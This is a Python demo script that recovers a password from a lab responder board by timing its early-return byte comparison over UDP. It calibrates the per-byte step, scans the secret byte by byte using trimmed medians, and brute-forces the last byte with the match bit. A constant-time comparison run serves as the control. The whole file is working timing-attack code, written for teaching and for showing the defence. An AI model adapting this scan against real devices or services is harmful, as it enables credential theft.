# Copyright 2026 Colin O'Flynn
# SPDX-License-Identifier: Apache-2.0
"""Recover a password from how long a device takes to reject it.

    python demos/password/recover.py --port COM9 --ramp
    python demos/password/recover.py --port COM9
    python demos/password/recover.py --port COM9 --const-time --ramp

Three things, in the order worth doing them:

  --ramp         measure the per-byte step, and say whether recovery is feasible
  (default)      recover the secret, one byte at a time
  --const-time   either of those against the constant-time comparison, which is
                 the control: a flat result there is what says the measurement
                 was sensitive enough to have seen a difference if there were one

THE ATTACK, in one paragraph. The device compares a guess against its secret one
byte at a time and returns at the first byte that differs, so the time it takes
to say "no" grows with the number of leading bytes that were right. Fix the bytes
already known, try all 256 values for the next one, and the value that takes
longest is the right one. Repeat. That is 256 guesses per byte instead of 256^n
for the whole password -- the difference between a demo and a heat death.

WHAT IS MEASURED. The responder reports its own receive-to-send interval in every
reply and the comparison happens inside it, so `victim_us` is the device's own
timing with the network removed. `dt_hw` is the round trip, which is what a
remote attacker actually has. Both are reported: the first says the channel
exists inside the device, the second says it is reachable from the far end of a
cable.

WHY THE LAST BYTE IS DIFFERENT. A wrong guess at the final position still runs
the whole loop -- it just fails on the last comparison instead of passing it --
so the timing step there is about zero. The last byte is found with the one bit
the device does return, which is 256 attempts and no statistics. That is not a
weakness of the method; it is what the method is, and a demo that quietly
recovered the last byte "by timing" would be lying about it.

NOT a general password cracker. It knows the length and the protocol, and it
checks its answer against a secret compiled into the firmware. It is a
demonstration that an early-returning comparison leaks on real hardware at a
distance, and that a constant-time one does not.
"""
from __future__ import annotations

import argparse
import os
import string
import sys
import time

import numpy as np

_HERE = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(os.path.dirname(_HERE))
_JITTER = os.path.join(os.path.dirname(_HERE), "jitter")
for _p in (_HERE, _JITTER, _ROOT):
    if _p not in sys.path:
        sys.path.insert(0, _p)

import etv                                                      # noqa: E402
import pw                                                       # noqa: E402
from ethtimer import Device                                     # noqa: E402

#: The byte used to fill a guess out to the right length. If it happens to match
#: the secret's next byte the correct candidate takes LONGER still, so a bad
#: choice here only ever helps; it cannot create a false maximum.
FILLER = 0x00

#: Candidates, in the order they are tried. Printable first, so a demo that is
#: being watched finds a text password early and the order of a scan is visible;
#: every byte is still tried, because the point is not to assume text.
CANDIDATES = ([ord(c) for c in string.printable[:95]]
              + [b for b in range(256) if b not in
                 set(ord(c) for c in string.printable[:95])])


def show(b):
    """A guess as something readable."""
    return "".join(chr(x) if 32 <= x < 127 else "." for x in b)


class Oracle:
    """One password guess, `n` times, through the instrument."""

    def __init__(self, dev, n, gap, pad, const_time, pw_len, subgroups=3):
        self.dev = dev
        self.n = n
        self.subgroups = subgroups
        self.gap = gap
        self.pad = pad
        self.ct = const_time
        self.len = pw_len
        self.exchanges = 0
        self.requests = 0
        # The INSTRUMENT's clock, for dt_hw. The responder reports its
        # own in every reply and pw.median_us uses that one, because the
        # two boards need not be the same part.
        self.hz = float(dev.info().clock_hz)

    def ask(self, guess: bytes) -> dict:
        """One guess, `self.n` times. Returns medians, means and diagnostics.

        One `set_request` and one `run`, so the device plays the whole group with
        the host out of the loop. That matters for more than speed: the host
        contributes nothing to the interval, and every exchange in a group sees
        the same device state.

        THE MEDIAN IS THE ANSWER AND THE MEAN IS A DIAGNOSTIC. See
        `pw.median_cyc` -- the per-record value is a spike with a rare tail, and
        a scan on the mean picks a wrong byte whose median is the floor. This
        returns both so the report can show that the tail exists.
        """
        req = pw.request(guess, tag=self.requests, const_time=self.ct,
                         pad_to=self.pad)
        self.dev.set_request(req)
        self.dev.set_window(off=0, length=etv.RSP_HDR)

        # SEVERAL SHORT RUNS, AND THE MEDIAN OF THEM -- not one long run.
        #
        # A whole group can be slow together. Measured: the responder used to
        # print a status line once a second, and a fifteen-exchange group at a
        # 50 us gap is about 0.8 ms, so a group could land entirely inside one
        # print and read 60 cycles high. Nothing inside a group can repair that,
        # because the contamination is the majority of it -- and a scan duly
        # picked the candidate whose group had been slow.
        #
        # That print is gone, but the lesson is cheap to keep: three runs
        # separated in time, and the median of their three estimates. One
        # unlucky run is then outvoted rather than decisive. It costs two extra
        # serial round trips per candidate and buys independence from anything
        # that lasts less than a run.
        ests_v, ests_r = [], []
        parts = max(1, self.subgroups)
        each = max(1, self.n // parts)
        recs = None
        for _ in range(parts):
            b = self.dev.run(n=each, gap_us=self.gap, check_link=False)
            self.exchanges += len(b)
            if len(b) == 0:
                continue
            dd = pw.decode(b.window)
            uu = pw.usable(dd)
            thr0 = pw.EXCURSION_CYC / self.hz * 1e6
            ests_v.append(pw.trimmed_mean(dd["victim_us"][uu], thr0))
            rr = b.dt_hw.astype(np.float64) / self.hz * 1e6
            ests_r.append(pw.trimmed_mean(rr, thr0))
            recs = b if recs is None else recs
        b = recs
        self.requests += 1

        if b is None or len(b) == 0:
            raise RuntimeError(
                "no records for guess %r. If the responder answers MEASURE "
                "requests but not this one it was built without the password "
                "check -- rebuild it from a tree that has "
                "firmware/common/pwcheck.c." % show(guess))

        d = pw.decode(b.window)
        if d["pw_bad_req"].any():
            raise RuntimeError(
                "the responder flagged %d of %d requests as unparseable. Its "
                "guess length or offsets disagree with this host's; "
                "tests/test_password_proto.py holds them together."
                % (int(d["pw_bad_req"].sum()), len(b)))

        rtt = b.dt_hw.astype(np.float64) / self.hz * 1e6
        u = pw.usable(d)
        # The trim threshold, in microseconds: three byte-times, which nothing
        # the comparison does can reach. See pw.trimmed_mean.
        thr = pw.EXCURSION_CYC / self.hz * 1e6
        return dict(
            v_cyc=pw.median_cyc(d),
            v_us=pw.median_us(d),
            # The median ACROSS runs of the trimmed mean WITHIN each run.
            v_trim=float(np.median(ests_v)) if ests_v else float("nan"),
            r_sub=len(ests_r),
            v_mean=pw.mean_us(d),
            v_sem=pw.sem_us(d),
            r_us=float(np.median(rtt)),
            r_trim=float(np.median(ests_r)) if ests_r else float("nan"),
            r_mean=float(np.mean(rtt)),
            r_sem=float(np.std(rtt, ddof=1) / np.sqrt(len(rtt))),
            excursions=pw.excursions(d),
            modal=pw.modal_fraction(d),
            n=len(b),
            match=bool(d["pw_match"].all()),
        )


def ramp(o: Oracle, secret: bytes):
    """Measure the step per correct leading byte, and report feasibility.

    Uses the known secret to BUILD the guesses -- this is the calibration, not
    the attack. It answers "is there a signal, and how many exchanges per
    candidate does it take to see it", which is the question to settle before
    spending twenty minutes on a scan.
    """
    print("ramp: %d correct leading bytes at a time, %d exchanges each, "
          "%s comparison"
          % (o.len, o.n, "CONSTANT-TIME" if o.ct else "early-return"))
    print()
    print("  correct  victim cyc   victim us   (mean us)  modal  excur   "
          "round trip us  match")
    rows = []
    for k in range(o.len + 1):
        if k < o.len:
            # k correct bytes, then one that is definitely wrong, then filler.
            wrong = (secret[k] + 1) & 0xFF
            guess = secret[:k] + bytes([wrong]) \
                  + bytes([FILLER]) * (o.len - k - 1)
        else:
            guess = secret
        g = o.ask(guess)
        g["k"] = k
        rows.append(g)
        print("  %7d  %10.1f  %10.4f  %9.4f  %4.0f%%  %2d/%-3d  %13.4f  %s"
              % (k, g["v_cyc"], g["v_us"], g["v_mean"], 100.0 * g["modal"],
                 g["excursions"], g["n"], g["r_us"], "YES" if g["match"] else "no"))

    print()
    # The step per byte, fitted over the positions where a step can exist. The
    # LAST one is excluded: a wrong guess there runs the whole loop too -- it
    # fails the final comparison instead of passing it -- so there is nothing to
    # step, and including it would flatten the fit.
    use = [r for r in rows if r["k"] < o.len]
    if len(use) < 3:
        print("  too few points to fit a step")
        return
    ks = np.array([r["k"] for r in use], float)

    step_cyc = np.polyfit(ks, np.array([r["v_cyc"] for r in use], float), 1)[0]
    step_rtt = np.polyfit(ks, np.array([r["r_us"] for r in use], float), 1)[0]
    modal = float(np.mean([r["modal"] for r in use]))
    excur = float(np.mean([r["excursions"] / max(1, r["n"]) for r in use]))

    print("  step per correct byte:  %+.2f responder cycles (%+.4f us),"
          "  %+.4f us round trip" % (step_cyc, step_cyc / o.hz * 1e6, step_rtt))
    print("  per-record value is the same number in %.1f%% of exchanges; "
          "%.1f%% are excursions" % (100.0 * modal, 100.0 * excur))
    print()

    if abs(step_cyc) < 1.0:
        print("  NO STEP: less than one cycle per byte. There is nothing here to")
        print("  recover from, and the row above says the measurement would have")
        print("  resolved %.0f%%-concentrated values -- so this is the "
              "comparison, not" % (100.0 * modal))
        print("  the instrument.")
    else:
        # With a value this concentrated the median is exact once a majority of
        # records sit on it, so the group size is a counting argument rather
        # than a sigma calculation.
        need = 3 if modal > 0.8 else (15 if modal > 0.5 else 0)
        if need:
            print("  RECOVERABLE. The median of %d exchanges per candidate is "
                  "enough: fewer" % need)
            print("  than half of them can be excursions, and the step is %.0f "
                  "cycles against a" % abs(step_cyc))
            print("  value that is identical in %.0f%% of records. A %d-byte "
                  "scan is then about"
                  % (100.0 * modal, o.len))
            print("  %s exchanges." % _si(need * 256 * max(1, o.len - 1)))
        else:
            print("  There is a step, but the per-record value is too spread "
                  "for a median to")
            print("  be exact on a small group (%.0f%% modal). Raise --n and "
                  "look again." % (100.0 * modal))
    print()
    if o.ct:
        print("  THIS IS THE CONTROL. A step near zero here, with the same "
              "concentration as")
        print("  the early-return run, is what says the measurement could have "
              "seen one.")
    else:
        print("  Now run --const-time --ramp: same device, same cable, same "
              "instrument,")
        print("  comparison written the other way. THAT run is what rules out "
              "the instrument.")


def _si(x: float) -> str:
    if x >= 1e9:
        return "%.1fe9" % (x / 1e9)
    if x >= 1e6:
        return "%.1fM" % (x / 1e6)
    if x >= 1e3:
        return "%.0fk" % (x / 1e3)
    return "%.0f" % x


def scan(o: Oracle, secret: bytes, series: str, verbose: bool):
    """Recover the secret byte by byte. Returns what it found."""
    known = b""
    # THE MEDIAN, not the mean. `ask` returns both; a scan on the mean found the
    # correct first byte and then a wrong second one, because a rare half-
    # microsecond excursion on the responder moved one candidate's mean by a
    # third of the step while its median sat on the floor. See pw.median_cyc.
    # A TRIMMED MEAN, not a plain mean and not a median. pw.trimmed_mean says
    # why both of the simpler choices fail, and they fail differently on the two
    # clocks: a plain mean on the responder's own interval is poisoned by a rare
    # half-microsecond excursion, and a median on the round trip ties because the
    # round trip is quantised to the RMII byte clock. Both failures were
    # measured, and both returned a plausible-looking wrong password.
    key = "v_trim" if series == "victim" else "r_trim"

    print("scan: %d positions, %d candidates each, %d exchanges each (%s, "
          "median)" % (o.len, len(CANDIDATES), o.n, series))
    print("      the last byte comes from the match bit, not from timing")
    print()

    t0 = time.time()
    for pos in range(o.len - 1):
        best, best_t, second_t = None, -1e18, -1e18
        for c in CANDIDATES:
            guess = known + bytes([c]) + bytes([FILLER]) * (o.len - pos - 1)
            t = o.ask(guess)[key]
            if t > best_t:
                second_t, best, best_t = best_t, c, t
            elif t > second_t:
                second_t = t
            if verbose:
                print("    pos %d cand %3d (%s) %9.4f"
                      % (pos, c, show(bytes([c])), t))
        known += bytes([best])
        margin = best_t - second_t
        print("  position %d: %-3d %-3s  %9.4f us, %+.4f us clear of the "
              "runner-up   -> %r"
              % (pos, best, show(bytes([best])), best_t, margin, show(known)))
        if margin <= 0:
            print("    *** no separation at this position; everything after it "
                  "is guesswork ***")

    # The last byte: the device returns one bit, so use it.
    print()
    print("  last position: asking the device, 256 tries at most")
    found = None
    for c in CANDIDATES:
        guess = known + bytes([c])
        if o.ask(guess)["match"]:
            found = c
            break
    if found is None:
        print("    no guess matched -- the bytes before it are wrong")
        return known + b"?"
    known += bytes([found])
    print("    %d (%s) accepted" % (found, show(bytes([found]))))

    dt = time.time() - t0
    print()
    print("recovered %r in %.0f s and %s exchanges (%s requests)"
          % (show(known), dt, _si(o.exchanges), _si(o.requests)))
    if known == secret:
        print("  CORRECT: it is the secret compiled into the firmware.")
    else:
        print("  WRONG: the firmware holds %r." % show(secret))
        print("  Positions that differ: %s"
              % ", ".join(str(i) for i in range(len(secret))
                          if i < len(known) and known[i] != secret[i]))
    return known


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.split("\n")[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--port", default=os.environ.get("ETHTIMER_PORT", ""),
                    help="the instrument's VCP")
    ap.add_argument("--ip", default="192.168.7.20")
    ap.add_argument("--mask", default="255.255.255.0")
    ap.add_argument("--gw", default="192.168.7.1")
    ap.add_argument("--victim", default="192.168.7.10")
    ap.add_argument("--n", type=int, default=200,
                    help="exchanges per guess. --ramp says what it should be")
    ap.add_argument("--gap", type=int, default=50,
                    help="microseconds of idle between exchanges")
    ap.add_argument("--pad", type=int, default=64,
                    help="total payload bytes, each way. FIXED across a sweep: "
                         "frame size costs 80 ns a byte each way, which is "
                         "bigger than the signal")
    ap.add_argument("--len", type=int, default=len(pw.SECRET),
                    help="password length. Public: the device rejects a wrong "
                         "length faster than anything else, so this is the one "
                         "thing a scan never has to search")
    ap.add_argument("--const-time", action="store_true",
                    help="use the device's constant-time comparison -- the "
                         "control, which should show no step and recover nothing")
    ap.add_argument("--ramp", action="store_true",
                    help="measure the per-byte step and stop")
    ap.add_argument("--series", choices=("victim", "rtt"), default="victim",
                    help="which clock to scan on: the device's own reported "
                         "interval, or the round trip a remote attacker has")
    ap.add_argument("--subgroups", type=int, default=3,
                    help="split --n into this many separate runs and take the "
                         "median of their estimates. Protects against a whole "
                         "group being slow together, which no trimming inside "
                         "one group can repair")
    ap.add_argument("--verbose", action="store_true",
                    help="print every candidate, not just the winner")
    a = ap.parse_args(argv)

    port = a.port
    if not port:
        from ethtimer.cli import _pick_port
        port, why = _pick_port()
        if port is None:
            raise SystemExit("no --port given and " + why)
        print("using %s" % port)

    with Device(port) as dev:
        print(dev.info())
        dev.set_net(ip=a.ip, mask=a.mask, gw=a.gw, victim=a.victim)
        dev.set_target(port=etv.PORT, timeout_ms=50)

        # Warm ARP and confirm the responder is the one we think it is.
        probe = dev.oneshot(pw.request(b"x" * a.len, pad_to=a.pad))
        if not probe:
            raise SystemExit(
                "no reply from the responder on UDP %d. Check --victim, and "
                "that the other board is running firmware/victim_raw (or "
                "firmware/victim)." % etv.PORT)
        o = Oracle(dev, a.n, a.gap, a.pad, a.const_time, a.len,
                   subgroups=a.subgroups)

        if a.ramp:
            ramp(o, pw.SECRET)
            return 0
        scan(o, pw.SECRET, a.series, a.verbose)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
